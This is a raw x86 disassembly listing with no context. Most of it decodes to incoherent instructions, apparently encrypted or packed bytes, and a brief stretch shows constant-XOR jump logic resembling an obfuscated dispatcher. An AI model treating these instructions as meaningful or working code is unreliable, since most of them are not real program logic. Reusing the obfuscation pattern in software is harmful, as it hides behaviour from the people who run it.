  40c133:	popf   
  40c134:	mov    WORD PTR [ecx],?
  40c136:	stos   DWORD PTR es:[edi],eax
  40c137:	iret   
  40c138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c139:	add    DWORD PTR [eax-0x68],ebp
  40c13c:	out    dx,eax
  40c13d:	lods   eax,DWORD PTR ds:[esi]
  40c13e:	cmp    dh,dh
  40c140:	mov    WORD PTR [edx],fs
  40c142:	sub    esp,eax
  40c144:	dec    esp
  40c145:	mov    esp,0x90317c88
  40c14a:	aad    0xce
  40c14c:	cmc    
  40c14d:	and    al,0xa0
  40c14f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c150:	mov    esi,0x96b07c9f
  40c155:	push   esp
  40c156:	daa    
  40c157:	inc    esp
  40c158:	dec    edi
  40c159:	jle    0x40c1d7
  40c15b:	repz mov al,0x86
  40c15e:	adc    al,0x8
  40c160:	hlt    
  40c161:	xchg   BYTE PTR [ebx+0x247b9b95],cl
  40c167:	and    dl,BYTE PTR [eax]
  40c169:	push   0x260e7b67
  40c16e:	mov    WORD PTR [esi+0x3a],cs
  40c171:	cmp    eax,0xa07738a6
  40c176:	and    DWORD PTR [esi-0x4b99f4c6],ebp
  40c17c:	mov    ah,0x8e
  40c17e:	and    ebx,DWORD PTR [eax]
  40c180:	(bad)  [edi]
  40c182:	shl    ecx,cl
  40c184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c185:	popa   
  40c186:	jg     0x40c1de
  40c188:	sub    al,0x52
  40c18a:	ss push es
  40c18c:	inc    eax
  40c18d:	mov    bl,0xfd
  40c18f:	neg    DWORD PTR [edi+0x1a]
  40c192:	inc    ebp
  40c193:	loop   0x40c1a3
  40c195:	ins    DWORD PTR es:[edi],dx
  40c196:	test   eax,0xf94f9089
  40c19b:	(bad)  
  40c19c:	and    al,0x5
  40c19e:	ret    
  40c19f:	push   cs
  40c1a0:	jb     0x40c146
  40c1a2:	aam    0x8b
  40c1a4:	arpl   WORD PTR [ebp-0x6f],cx
  40c1a7:	pop    es
  40c1a8:	scas   al,BYTE PTR es:[edi]
  40c1a9:	mov    BYTE PTR ds:0xbeed04c,bl
  40c1af:	dec    edi
  40c1b0:	push   esi
  40c1b1:	xor    ah,cl
  40c1b3:	jmp    0x5b74d80
  40c1b8:	mov    edx,0x90c9499c
  40c1bd:	shr    ch,1
  40c1bf:	fiadd  DWORD PTR [edx]
  40c1c1:	sub    esp,esi
  40c1c3:	adc    al,0xf9
  40c1c5:	adc    dl,BYTE PTR [ebx]
  40c1c7:	add    DWORD PTR [esi+0x34],edx
  40c1ca:	mov    al,0x7a
  40c1cc:	ja     0x40c1ca
  40c1ce:	call   0x319c93f9
  40c1d3:	shr    ebp,0xf3
  40c1d6:	rcr    DWORD PTR [ebx-0x19],1
  40c1d9:	mov    ebx,0xa62139f4
  40c1de:	(bad)  [edi-0xa8f1a89]
  40c1e4:	sub    al,0xf
  40c1e6:	mov    dl,0x8e
  40c1e8:	add    BYTE PTR [edi],dh
  40c1ea:	pop    esp
  40c1eb:	fistp  QWORD PTR [eax-0x37]
  40c1ee:	cmp    dl,BYTE PTR [ebx-0x2369a84]
  40c1f4:	imul   edx,DWORD PTR [esi-0xc],0x45
  40c1f8:	mov    DWORD PTR ds:0xb5e4a46f,ebx
  40c1fe:	ja     0x40c210
  40c200:	xor    DWORD PTR [eax],eax
  40c202:	mov    ch,BYTE PTR [ecx+edi*2+0x1f]
  40c206:	retf   
  40c207:	adc    eax,0xf6eddfa9
  40c20c:	adc    eax,edx
  40c20e:	xchg   DWORD PTR ds:0x132c9275,edi
  40c214:	stc    
  40c215:	jge    0x40c279
  40c217:	cwde   
  40c218:	xor    DWORD PTR [edi+ecx*8],esi
  40c21b:	cmp    ch,BYTE PTR [edx-0x2f]
  40c21e:	into   
  40c21f:	adc    al,0xe1
  40c221:	pop    ecx
  40c222:	jne    0x40c24a
  40c224:	xor    ebp,DWORD PTR ds:0x6e4607fb
  40c22a:	or     DWORD PTR [edi],eax
  40c22c:	inc    ecx
  40c22d:	add    al,BYTE PTR [ecx-0x6a]
  40c230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c231:	xchg   DWORD PTR [ebp+0x621e430d],edi
  40c237:	outs   dx,DWORD PTR ds:[esi]
  40c238:	sar    BYTE PTR [edx],cl
  40c23a:	sub    eax,0x18e13eac
  40c23f:	dec    ebp
  40c240:	add    BYTE PTR [ebx-0x18],cl
  40c243:	sahf   
  40c244:	les    esp,FWORD PTR [eax]
  40c246:	sahf   
  40c247:	jmp    0x40c25b
  40c249:	jnp    0x40c1fd
  40c24b:	dec    ebx
  40c24c:	pop    edi
  40c24d:	loope  0x40c2c2
  40c24f:	in     al,dx
  40c250:	adc    eax,0x501262d0
  40c255:	sub    ah,BYTE PTR [edx]
  40c257:	and    DWORD PTR [ebx],esi
  40c259:	pushf  
  40c25a:	jmp    0xa91902d5
  40c25f:	sub    al,0x2f
  40c261:	mov    bl,0x97
  40c263:	mov    ebp,0x6875d111
  40c268:	xor    DWORD PTR [edi-0x6eacbe42],0x70671de6
  40c272:	out    0xc9,al
  40c274:	jp     0x40c290
  40c276:	(bad)  
  40c277:	fwait
  40c278:	jl     0x40c24c
  40c27a:	jg     0x40c2dc
  40c27c:	pop    ss
  40c27d:	xchg   BYTE PTR [edi+0x35],ch
  40c280:	xchg   ecx,eax
  40c281:	or     bh,BYTE PTR [edi-0x20991455]
  40c287:	or     edx,edi
  40c289:	addr16 push es
  40c28b:	test   eax,esi
  40c28d:	out    dx,al
  40c28e:	int    0x12
  40c290:	add    ecx,DWORD PTR [edx+0x25c54c89]
  40c296:	xchg   ebp,eax
  40c297:	pop    ebx
  40c298:	add    al,0x33
  40c29a:	stc    
  40c29b:	or     BYTE PTR [edi+0x33],bh
  40c29e:	mov    ecx,0xc3181ccc
  40c2a3:	and    DWORD PTR [ebx-0xc],eax
  40c2a6:	or     BYTE PTR [ebp-0x5c],0xc1
  40c2aa:	pushf  
  40c2ab:	mov    ebp,0x8f225318
  40c2b0:	cmp    dh,BYTE PTR [ecx-0x661c9164]
  40c2b6:	jae    0x40c277
  40c2b8:	mov    ds:0xd75e27ad,al
  40c2bd:	(bad)  
  40c2be:	clc    
  40c2bf:	(bad)  
  40c2c1:	push   ebx
  40c2c2:	popa   
  40c2c3:	mov    ds:0xa9b1ba84,eax
  40c2c8:	sbb    ch,bl
  40c2ca:	inc    esp
  40c2cb:	shl    esi,1
  40c2cd:	stos   BYTE PTR es:[edi],al
  40c2ce:	stos   DWORD PTR es:[edi],eax
  40c2cf:	push   edi
  40c2d0:	nop
  40c2d1:	xchg   ecx,esi
  40c2d3:	jecxz  0x40c27e
  40c2d5:	push   ds
  40c2d6:	sub    al,0x37
  40c2d8:	ds adc ch,cl
  40c2db:	xchg   bh,ah
  40c2dd:	fs in  eax,dx
  40c2df:	and    ah,BYTE PTR [edi]
  40c2e1:	mov    al,0x6b
  40c2e3:	fs clc 
  40c2e5:	aaa    
  40c2e6:	out    dx,al
  40c2e7:	in     al,0x20
  40c2e9:	scas   eax,DWORD PTR es:[edi]
  40c2ea:	push   esi
  40c2eb:	inc    ebx
  40c2ec:	adc    DWORD PTR [edi+0x742b56f9],edx
  40c2f2:	jecxz  0x40c318
  40c2f4:	cs (bad) 
  40c2f6:	mov    bh,0xd6
  40c2f8:	lds    ebx,FWORD PTR cs:[ebx-0x7]
  40c2fc:	adc    BYTE PTR [edx+0x60987972],0x14
  40c303:	mov    cs,WORD PTR [ecx]
  40c305:	jno    0x40c36d
  40c307:	mov    ah,BYTE PTR [eax+0x71]
  40c30a:	xor    eax,0xd963f818
  40c30f:	jmp    0xe0ff:0xa64c9074
  40c316:	popf   
  40c317:	arpl   WORD PTR ds:0x942ac27a,si
  40c31d:	and    BYTE PTR [eax],dl
  40c31f:	dec    edi
  40c320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c321:	mov    eax,ds:0x68341275
  40c326:	adc    al,0x75
  40c328:	es ret 
  40c32a:	mov    eax,0x94b87edc
  40c32f:	call   DWORD PTR [edx+0x6e2d50fe]
  40c335:	ins    BYTE PTR es:[edi],dx
  40c336:	cwde   
  40c337:	std    
  40c338:	lahf   
  40c339:	repnz cmp dl,bl
  40c33c:	adc    DWORD PTR [ebp+0x475cb6d],0xffffff9e
  40c343:	sub    edi,0xffffffc8
  40c346:	inc    ebx
  40c347:	adc    ebx,DWORD PTR [ecx]
  40c349:	daa    
  40c34a:	jno    0x40c341
  40c34c:	and    eax,0x42b58247
  40c351:	lahf   
  40c352:	add    ecx,ebx
  40c354:	in     al,dx
  40c355:	or     eax,0x531051b0
  40c35a:	out    dx,al
  40c35b:	mov    ds:0x4cfb8450,al
  40c360:	xlat   BYTE PTR ds:[ebx]
  40c361:	mov    fs,WORD PTR ds:0x30b643d4
  40c367:	xchg   ebp,eax
  40c368:	scas   al,BYTE PTR es:[edi]
  40c369:	or     eax,0xd138a850
  40c36e:	mov    eax,0x22e140e6
  40c373:	or     al,0x80
  40c375:	inc    esi
  40c376:	pusha  
  40c377:	fcmovnb st,st(6)
  40c379:	pop    es
  40c37a:	ins    DWORD PTR es:[edi],dx
  40c37b:	inc    eax
  40c37c:	xor    eax,0x1757da1b
  40c381:	xchg   edi,eax
  40c382:	fisub  WORD PTR [edi-0x6e]
  40c385:	and    ecx,DWORD PTR [ecx]
  40c387:	add    al,0xae
  40c389:	xor    ebx,DWORD PTR [eax-0x54]
  40c38c:	repz cmp al,0xe9
  40c38f:	scas   eax,DWORD PTR es:[edi]
  40c390:	shl    cl,0xf0
  40c393:	mov    bh,0xda
  40c395:	inc    edi
  40c396:	xor    BYTE PTR [esi+esi*8+0x1e60a32b],al
  40c39d:	inc    ebx
  40c39e:	jmp    0xb9c1:0x82f1d12b
  40c3a5:	fldenv [edx+0x684ec3e5]
  40c3ab:	stos   DWORD PTR es:[edi],eax
  40c3ac:	clc    
  40c3ad:	out    0xf,al
  40c3af:	sbb    eax,0xffe52257
  40c3b4:	test   DWORD PTR [ecx+edx*8-0x65],0x8cc23d99
  40c3bc:	and    ecx,DWORD PTR [ecx]
  40c3be:	add    BYTE PTR [ecx+ebx*8+0x1f2d2987],cl
  40c3c5:	xchg   edi,eax
  40c3c6:	test   DWORD PTR [edx+0x63e7854b],ebx
  40c3cc:	xor    eax,0xa99c4cba
  40c3d1:	cmp    ch,ah
  40c3d3:	shr    ah,0x14
  40c3d6:	ret    0x6385
  40c3d9:	int    0xb6
  40c3db:	cmp    esi,edx
  40c3dd:	aad    0x7c
  40c3df:	jecxz  0x40c3f8
  40c3e1:	adc    eax,0x7c07e595
  40c3e6:	inc    eax
  40c3e7:	cdq    
  40c3e8:	jle    0x40c3b8
  40c3ea:	push   esp
  40c3eb:	loop   0x40c447
  40c3ed:	repnz cdq 
  40c3ef:	xor    esi,ebx
  40c3f1:	jg     0x40c42d
  40c3f3:	cmp    DWORD PTR [esi+0x78],edi
  40c3f6:	lds    ebp,FWORD PTR cs:[edi-0x2b]
  40c3fa:	sbb    edi,esi
  40c3fc:	push   ebx
  40c3fd:	leave  
  40c3fe:	or     esi,edx
  40c400:	daa    
  40c401:	jl     0x40c411
  40c403:	mov    BYTE PTR [edx-0x4045f694],dl
  40c409:	retf   
  40c40a:	mov    al,ds:0x53e8f265
  40c40f:	stos   BYTE PTR es:[edi],al
  40c410:	sbb    al,0x3d
  40c412:	test   eax,edi
  40c414:	xchg   edx,eax
  40c415:	inc    edx
  40c416:	xchg   ecx,eax
  40c417:	dec    ebp
  40c418:	(bad)  
  40c419:	xchg   ebx,eax
  40c41a:	popa   
  40c41b:	jmp    0x1385:0x89692f2f
  40c422:	dec    esp
  40c423:	dec    eax
  40c424:	inc    edi
  40c425:	xor    BYTE PTR [ebx-0x5e9a892e],ch
  40c42b:	and    eax,0xd6f30a54
  40c430:	xchg   esi,eax
  40c431:	push   ds
  40c432:	push   es
  40c433:	inc    edx
  40c434:	mov    ah,0x5b
  40c436:	jnp    0x40c4ab
  40c438:	dec    edx
  40c439:	loopne 0x40c482
  40c43b:	cmp    DWORD PTR [ebx+ebx*2-0x36cbf855],ecx
  40c442:	mov    ebp,0x657124e8
  40c447:	mov    cl,0x87
  40c449:	(bad)  
  40c44a:	out    0xb0,eax
  40c44c:	lea    eax,[edx+0x65170119]
  40c452:	sbb    ah,BYTE PTR [edx+0x5]
  40c455:	(bad)  
  40c456:	fisttp DWORD PTR [edi-0x69]
  40c459:	(bad)  
  40c45a:	sti    
  40c45b:	pop    ecx
  40c45c:	out    0x8f,al
  40c45e:	jmp    0x40c402
  40c460:	ret    
  40c461:	icebp  
  40c462:	in     eax,0xa7
  40c464:	add    ch,BYTE PTR [ebx+edx*1]
  40c467:	stos   DWORD PTR es:[edi],eax
  40c468:	mov    esp,0x6b5bb799
  40c46d:	out    dx,eax
  40c46e:	sub    ch,BYTE PTR [ebx-0x7a59e062]
  40c474:	out    dx,al
  40c475:	push   esp
  40c476:	mov    ecx,0xb301ed50
  40c47b:	cdq    
  40c47c:	ins    DWORD PTR es:[edi],dx
  40c47d:	cmp    eax,0x7b9980d6
  40c482:	push   edx
  40c483:	stc    
  40c484:	ret    
  40c485:	pushf  
  40c486:	ins    DWORD PTR es:[edi],dx
  40c487:	js     0x40c42a
  40c489:	dec    ebx
  40c48a:	mov    ds:0x34af4b05,al
  40c48f:	dec    esp
  40c490:	dec    esi
  40c491:	mov    eax,0x9078ce2d
  40c496:	in     al,dx
  40c497:	sar    BYTE PTR [edx-0x1858eac9],0x93
  40c49e:	push   ecx
  40c49f:	or     BYTE PTR [eax+0x7a05e104],dl
  40c4a5:	popf   
  40c4a6:	cmp    ebp,DWORD PTR [ebx]
  40c4a8:	test   BYTE PTR [ebx+0x39],cl
  40c4ab:	hlt    
  40c4ac:	inc    ebp
  40c4ad:	sbb    ebx,DWORD PTR [eax-0x5321646d]
  40c4b3:	mov    al,ds:0x3077b573
  40c4b8:	add    eax,0xcd56c7f9
  40c4bd:	xchg   ecx,eax
  40c4be:	mov    esp,DWORD PTR [ebp-0x2]
  40c4c1:	mov    al,ds:0x465cbb07
  40c4c6:	test   WORD PTR [ebp-0x2b442c82],bp
  40c4cd:	jl     0x40c50d
  40c4cf:	fisubr DWORD PTR [edx-0xc]
  40c4d2:	mov    dl,0x27
  40c4d4:	pop    ecx
  40c4d5:	imul   esi,DWORD PTR [ebx+eiz*4-0x5a],0x7e
  40c4da:	cmp    eax,0x9b13bdc
  40c4df:	daa    
  40c4e0:	dec    edx
  40c4e1:	stos   DWORD PTR es:[edi],eax
  40c4e2:	arpl   WORD PTR [edi-0x52],di
  40c4e5:	nop
  40c4e6:	xor    eax,0x13fa64b2
  40c4eb:	pop    edx
  40c4ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4ed:	nop
  40c4ee:	sub    eax,0x5703cb15
  40c4f3:	imul   edx,edi
  40c4f6:	mov    DWORD PTR [ebp+0xc],edx
  40c4f9:	mov    edx,DWORD PTR [ebp+0xc]
  40c4fc:	mov    DWORD PTR [ebp-0x24],edx
  40c4ff:	mov    edx,DWORD PTR [ebp-0x8]
  40c502:	add    edx,DWORD PTR [ebp-0x40]
  40c505:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40c50c:	mov    DWORD PTR [ebp-0x1c],edx
  40c50f:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  40c516:	mov    DWORD PTR [ebp-0x44],0xf89c8538
  40c51d:	mov    edx,DWORD PTR [ebp-0x18]
  40c520:	xor    edx,eax
  40c522:	add    edx,ecx
  40c524:	jmp    0x40cdbf
  40c529:	mov    edx,DWORD PTR [ebp-0x18]
  40c52c:	xor    edx,eax
  40c52e:	jmp    0x40c945
  40c533:	sub    al,0x9b
  40c535:	inc    edx
  40c536:	(bad)  
  40c537:	dec    ebp
  40c538:	idiv   DWORD PTR [ebp+esi*2-0x2cf58fc4]
  40c53f:	imul   esp,DWORD PTR [ebp+0x6b],0xffffff84
  40c543:	rcl    BYTE PTR [esi+0x79707e7e],1
  40c549:	jle    0x40c5c9
  40c54b:	fdiv   st,st(2)
  40c54d:	add    DWORD PTR [edx+0x1e0a0959],ebp
  40c553:	or     BYTE PTR [ebx-0x2a],bl
  40c556:	jl     0x40c551
  40c558:	(bad)  
  40c559:	rcr    ch,0xcb
  40c55c:	mov    ds:0xf5c1dabf,al
  40c561:	fs pop ss
  40c563:	sbb    cl,BYTE PTR [edx]
  40c565:	dec    esp
  40c566:	lock lahf 
  40c568:	retf   
  40c569:	sbb    ebp,esp
  40c56b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c56c:	ror    BYTE PTR [ecx+0x5130dc88],0x75
  40c573:	inc    eax
  40c574:	pop    ss
  40c575:	xchg   BYTE PTR [ecx],bh
  40c577:	test   al,0xbe
  40c579:	clc    
  40c57a:	in     al,dx
  40c57b:	js     0x35b88644
  40c581:	push   ds
  40c582:	fstp   QWORD PTR [eax-0x24a3c56e]
  40c588:	(bad)  
  40c589:	jne    0x40c5d6
  40c58b:	xchg   BYTE PTR ss:[edi+esi*4-0x50001782],bh
  40c593:	dec    ecx
  40c594:	iret   
  40c595:	sbb    al,0x3e
  40c597:	addr16 stc 
  40c599:	fldcw  WORD PTR [eax+0x22d879f7]
  40c59f:	mov    dl,BYTE PTR [edi-0x50c8fb1f]
  40c5a5:	pop    ds
  40c5a6:	int3   
  40c5a7:	inc    esp
  40c5a8:	ret    0x53ae
  40c5ab:	out    dx,eax
  40c5ac:	mov    al,ds:0x136845f2
  40c5b1:	call   0x63098661
  40c5b6:	lods   al,BYTE PTR ds:[esi]
  40c5b7:	fistp  QWORD PTR [esi-0x21]
  40c5ba:	sbb    edx,DWORD PTR [eax+0x72]
  40c5bd:	pop    ebx
  40c5be:	pop    ss
  40c5bf:	ret    0xaa14
  40c5c2:	fcom   DWORD PTR ds:0x701e1397
  40c5c8:	push   0xbe3d03e7
  40c5cd:	(bad)  
  40c5ce:	mov    esi,0x2889999b
  40c5d3:	ret    
  40c5d4:	and    BYTE PTR [ecx],bh
  40c5d6:	cwde   
  40c5d7:	jae    0x40c5b8
  40c5d9:	dec    edx
  40c5da:	push   0x54d56929
  40c5df:	sub    eax,0x15af34be
  40c5e4:	iret   
  40c5e5:	sub    bh,BYTE PTR [esi+0x5]
  40c5e8:	repz ror BYTE PTR [edi-0x5d],1
  40c5ec:	sbb    DWORD PTR [edx+0x2b],ebp
  40c5ef:	retf   
  40c5f0:	jne    0x40c635
  40c5f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5f3:	aam    0x85
  40c5f5:	push   esp
  40c5f6:	push   ebx
  40c5f7:	into   
  40c5f8:	mov    edi,0x4c2cc972
  40c5fd:	xchg   DWORD PTR [ebx*8+0x60c44bc3],edi
  40c604:	in     al,0x67
  40c606:	pusha  
  40c607:	and    al,0x1a
  40c609:	pop    ebp
  40c60a:	fstp   QWORD PTR [eax]
  40c60c:	cmp    BYTE PTR [ebx-0x15],bh
  40c60f:	jg     0x40c5a9
  40c611:	mov    ds:0x912fab9,al
  40c616:	push   cs
  40c617:	retf   0x3588
  40c61a:	push   eax
  40c61b:	jne    0x40c61a
  40c61d:	mov    edx,0xf478e211
  40c622:	fldenv [esi-0xf041438]
  40c628:	jno    0x40c5f5
  40c62a:	inc    edx
  40c62b:	ja     0x40c651
  40c62d:	dec    esi
  40c62e:	daa    
  40c62f:	dec    ebp
  40c630:	add    eax,0x4bba7e14
  40c635:	jne    0x40c6b0
  40c637:	adc    edx,DWORD PTR [edi+esi*4]
  40c63a:	dec    edi
  40c63b:	scas   al,BYTE PTR es:[edi]
  40c63c:	shl    BYTE PTR [esi],0x33
  40c63f:	sub    al,0xee
  40c641:	sub    DWORD PTR [eax+ebx*1+0x1f4bab9d],edx
  40c648:	xchg   esp,eax
  40c649:	fs (bad) 
  40c64b:	test   eax,0x1e26c9f1
  40c650:	cdq    
  40c651:	pop    edx
  40c652:	shr    ah,0x8b
  40c655:	jno    0x40c5f4
  40c657:	(bad)  
  40c658:	pop    ebp
  40c659:	test   al,0x7f
  40c65b:	sar    BYTE PTR [eax],1
  40c65d:	mov    esp,0xd7185546
  40c662:	lahf   
  40c663:	lods   eax,DWORD PTR ds:[esi]
  40c664:	in     eax,dx
  40c665:	rol    BYTE PTR [ebx-0x33f0e4bb],1
  40c66b:	jae    0x40c5f1
  40c66d:	push   es
  40c66e:	clc    
  40c66f:	pushf  
  40c670:	sahf   
  40c671:	and    eax,0x418b858d
  40c676:	or     al,0xa2
  40c678:	pusha  
  40c679:	cmp    al,0x72
  40c67b:	das    
  40c67c:	or     bh,BYTE PTR [edx-0xc4373ab]
  40c682:	sub    eax,0x28bc56cf
  40c687:	je     0x40c6c9
  40c689:	sbb    dl,BYTE PTR [edi+0x300a8ddd]
  40c68f:	dec    eax
  40c690:	add    DWORD PTR [ebx+0x72],0xf3b6d50b
  40c697:	cmp    DWORD PTR [ebx+edx*2],0xffffff96
  40c69b:	iret   
  40c69c:	push   edi
  40c69d:	fnstcw WORD PTR [esi-0x7b]
  40c6a0:	jle    0x40c6b9
  40c6a2:	xor    eax,DWORD PTR [ecx+0x60d42625]
  40c6a8:	xor    al,BYTE PTR [esi+0x11ac663f]
  40c6ae:	jns    0x40c67a
  40c6b0:	pop    edx
  40c6b1:	mov    ecx,?
  40c6b3:	ret    
  40c6b4:	test   DWORD PTR [ecx],eax
  40c6b6:	jno    0x40c65f
  40c6b8:	loopne 0x40c6e9
  40c6ba:	and    ecx,DWORD PTR [ebx]
  40c6bc:	jne    0x40c69b
  40c6be:	imul   esp,DWORD PTR [edx-0x53],0xffffff88
  40c6c2:	out    0xf7,al
  40c6c4:	push   esp
  40c6c5:	add    DWORD PTR [eax+0x1669618],0x26cb2b68
  40c6cf:	in     al,dx
  40c6d0:	xor    BYTE PTR [ecx-0x6d507cad],al
  40c6d6:	outs   dx,DWORD PTR ds:[esi]
  40c6d7:	mov    DWORD PTR [ebx-0x18],edx
  40c6da:	jo     0x40c757
  40c6dc:	jl     0x40c669
  40c6de:	inc    esp
  40c6df:	stos   BYTE PTR es:[edi],al
  40c6e0:	dec    edx
  40c6e1:	push   ecx
  40c6e2:	(bad)  
  40c6e3:	xlat   BYTE PTR ds:[ebx]
  40c6e4:	xchg   BYTE PTR [edx+esi*4-0x78],al
  40c6e8:	js     0x40c6d1
  40c6ea:	pop    eax
  40c6eb:	add    DWORD PTR [eax+0x261a75bf],edx
  40c6f1:	fidiv  WORD PTR [ebp-0x12]
  40c6f4:	sub    DWORD PTR [edx-0x59f9eef1],0xffffffbb
  40c6fb:	mov    ebx,0x8ff4dffd
  40c700:	adc    al,0xaa
  40c702:	xor    BYTE PTR [ebx-0x58],dh
  40c705:	cld    
  40c706:	jge    0x40c6e5
  40c708:	adc    DWORD PTR [edx],ebp
  40c70a:	cwde   
  40c70b:	ja     0x40c703
  40c70d:	push   edi
  40c70e:	dec    ebx
  40c70f:	ffree  st(4)
  40c711:	shl    dl,1
  40c713:	in     al,dx
  40c714:	xchg   bx,ax
  40c716:	cwde   
  40c717:	dec    esp
  40c718:	ret    
  40c719:	push   esp
  40c71a:	jb     0x40c6bd
  40c71c:	add    al,0x40
  40c71e:	pop    eax
  40c71f:	mov    cl,0x9c
  40c721:	ret    0x6d86
  40c724:	out    dx,al
  40c725:	retf   0x3391
  40c728:	daa    
  40c729:	pop    ebp
  40c72a:	loop   0x40c6d3
  40c72c:	(bad)  
  40c72d:	stc    
  40c72e:	xchg   esi,eax
  40c72f:	pop    ecx
  40c730:	pop    ss
  40c731:	push   es
  40c732:	es mov dh,0x7
  40c735:	inc    ebp
  40c736:	push   esp
  40c737:	or     dh,BYTE PTR [edi]
  40c739:	iret   
  40c73a:	pop    edx
  40c73b:	(bad)  
  40c73c:	ins    DWORD PTR es:[edi],dx
  40c73d:	mov    dh,bh
  40c73f:	test   ah,al
  40c741:	int    0xc1
  40c743:	cdq    
  40c744:	loopne 0x40c7c0
  40c746:	pop    ebx
  40c747:	aas    
  40c748:	div    BYTE PTR [esi-0x3be6620b]
  40c74e:	test   BYTE PTR [edx],0xd
  40c751:	inc    edi
  40c752:	jecxz  0x40c6e8
  40c754:	jg     0x40c73a
  40c756:	jbe    0x40c78e
  40c758:	int    0x67
  40c75a:	or     al,0x4f
  40c75c:	popf   
  40c75d:	push   0x30de6b4c
  40c762:	mov    eax,0x9f61bf5b
  40c767:	cli    
  40c768:	xor    edx,DWORD PTR [ebp+0xd]
  40c76b:	outs   dx,BYTE PTR ds:[esi]
  40c76c:	mov    ah,0x3
  40c76e:	out    dx,al
  40c76f:	mov    ?,WORD PTR ds:[edx+0x622f234d]
  40c776:	add    dl,cl
  40c778:	outs   dx,DWORD PTR ds:[esi]
  40c779:	or     DWORD PTR [eax-0x3b],ebx
  40c77c:	mov    ebx,0x88056bd6
  40c781:	and    BYTE PTR [edi],ah
  40c783:	cs xchg ebp,eax
  40c785:	xchg   ecx,eax
  40c786:	mov    edi,0x786d2bb9
  40c78b:	jns    0x40c7c8
  40c78d:	xor    eax,0x3a88cfc6
  40c792:	(bad)  
  40c793:	mov    ebp,0x24b8b2ae
  40c798:	les    ebx,FWORD PTR [edi]
  40c79a:	inc    edx
  40c79b:	call   0x6413:0xb2548006
  40c7a2:	push   edi
  40c7a3:	jmp    0x40c803
  40c7a5:	mov    ebp,0x596b5df1
  40c7aa:	jle    0x40c74e
  40c7ac:	jo     0x40c7d0
  40c7ae:	out    0xb1,eax
  40c7b0:	xchg   dl,dh
  40c7b2:	mov    dh,BYTE PTR [esi]
  40c7b4:	rol    BYTE PTR [bp+si+0x6a59],cl
  40c7b9:	or     DWORD PTR [edi],eax
  40c7bb:	into   
  40c7bc:	test   al,0xd
  40c7be:	jg     0x40c7fe
  40c7c0:	je     0x40c7cb
  40c7c2:	add    DWORD PTR [edx-0x332a475a],ecx
  40c7c8:	repnz dec esp
  40c7ca:	stc    
  40c7cb:	and    al,0xdf
  40c7cd:	lods   eax,DWORD PTR ds:[esi]
  40c7ce:	dec    esp
  40c7cf:	xchg   ecx,eax
  40c7d0:	jno    0x40c76a
  40c7d2:	enter  0xa20b,0x36
  40c7d6:	adc    eax,0xc70642d2
  40c7db:	add    bl,BYTE PTR [edx+eiz*2-0x43]
  40c7df:	mov    edx,0xb2222105
  40c7e4:	fdivr  st,st(7)
  40c7e6:	aam    0xfa
  40c7e8:	ficomp WORD PTR [edx-0x33]
  40c7eb:	ja     0x40c7b0
  40c7ed:	sbb    BYTE PTR [edi],0x31
  40c7f0:	outs   dx,DWORD PTR ds:[esi]
  40c7f1:	xchg   edi,eax
  40c7f2:	shl    BYTE PTR [edx+0x7c],0x86
  40c7f6:	add    BYTE PTR [eax],0x1b
  40c7f9:	std    
  40c7fa:	xor    al,BYTE PTR [edi]
  40c7fc:	popf   
  40c7fd:	xor    dh,BYTE PTR [ebp+0x0]
  40c800:	mov    ebp,0x5fd8b6f4
  40c805:	lods   al,BYTE PTR ds:[esi]
  40c806:	mov    ebx,0xe7fae4ec
  40c80b:	repz adc bh,BYTE PTR [ebx-0x4b]
  40c80f:	cmp    ch,BYTE PTR [edi-0x78c14211]
  40c815:	sbb    ch,BYTE PTR [edx]
  40c817:	fcomp  QWORD PTR [edx+0x56]
  40c81a:	pop    es
  40c81b:	push   eax
  40c81c:	xchg   ecx,eax
  40c81d:	mov    esi,0xef7e6bb
  40c822:	sub    ecx,DWORD PTR [ecx-0x5b]
  40c825:	lahf   
  40c826:	lea    ecx,[ebp+eax*1+0x7]
  40c82a:	add    edi,DWORD PTR [ecx+0x2103bc3]
  40c830:	push   ds
  40c831:	imul   esi,DWORD PTR [ebp-0x62e68286],0x75
  40c838:	test   dh,0xf6
  40c83b:	or     ch,ch
  40c83d:	or     DWORD PTR [esi],edi
  40c83f:	dec    ebp
  40c840:	dec    BYTE PTR [esi]
  40c842:	push   edi
  40c843:	fcomp  QWORD PTR [ebp+esi*2-0x3b]
  40c847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c848:	nop
  40c849:	fsubp  st(3),st
  40c84b:	sub    al,0x96
  40c84d:	out    dx,al
  40c84e:	rol    DWORD PTR gs:[ebx+0x60],0x28
  40c853:	outs   dx,BYTE PTR ds:[esi]
  40c854:	mov    ebp,0x34e6cdad
  40c859:	rol    DWORD PTR [edi-0x134f3933],cl
  40c85f:	sar    DWORD PTR [esi+0x65],cl
  40c862:	mov    ss,WORD PTR [edi+0x6c]
  40c865:	mov    edi,0x42323ca5
  40c86a:	push   ds
  40c86b:	lds    ebx,FWORD PTR [esi]
  40c86d:	arpl   WORD PTR [esi+0x56cb0bd9],si
  40c873:	jmp    FWORD PTR [ebx]
  40c875:	(bad)  
  40c876:	xor    DWORD PTR [ecx+0x1d9ae67e],esi
  40c87c:	in     al,0x5c
  40c87e:	sbb    BYTE PTR gs:[edi-0x3307ce0d],ah
  40c885:	mov    eax,ds:0xe415d98c
  40c88a:	cmp    edx,DWORD PTR [edi]
  40c88c:	xchg   ecx,eax
  40c88d:	mov    bh,0x22
  40c88f:	pop    esp
  40c890:	inc    ebp
  40c891:	lea    edi,[edx]
  40c893:	mov    cl,0x9a
  40c895:	mov    cl,0x52
  40c897:	cmc    
  40c898:	scas   eax,DWORD PTR es:[edi]
  40c899:	popa   
  40c89a:	mov    al,0x5a
  40c89c:	mov    ecx,0x8a7ea8d5
  40c8a1:	or     al,0x6f
  40c8a3:	stos   BYTE PTR es:[edi],al
  40c8a4:	loope  0x40c918
  40c8a6:	in     al,0xf
  40c8a8:	sbb    BYTE PTR [edi+0x3ed16b3e],cl
